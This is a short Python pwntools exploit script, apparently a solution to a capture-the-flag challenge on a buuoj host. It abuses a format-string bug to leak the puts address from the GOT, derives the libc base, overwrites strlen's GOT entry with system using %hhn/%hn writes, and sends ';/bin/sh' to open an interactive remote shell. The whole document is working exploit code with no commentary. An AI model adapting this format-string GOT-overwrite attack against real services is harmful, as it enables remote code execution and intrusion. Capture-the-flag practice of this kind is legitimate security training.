from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",25818)
elf=ELF("./timu")
libc=ELF("./libc-2.23.so")

puts_got=elf.got["puts"]
strlen_got=elf.got["strlen"]

payload=b"%9$saaaa"+p64(puts_got)
sh.recvuntil(b"Please tell me:")
sh.send(payload)
sh.recvuntil(b"Repeater:")
puts_addr=u64(sh.recv(6).ljust(8,b"\x00"))
#puts_addr = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("puts_addr=",hex(puts_addr))

libc_base=puts_addr-libc.sym["puts"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]

system_low=system_addr & 0xffff
system_high=(system_addr >> 16) & 0xff
payload=b"%"+str(system_high-9).encode('utf-8')+b"c%12$hhn%"+str(system_low-system_high).encode('utf-8')+b"c%13$hn"
payload=payload.ljust(32,b'a')
payload+=p64(strlen_got+2)+p64(strlen_got)
sh.send(payload)
sh.sendline(b";/bin/sh\x00")

sh.interactive()
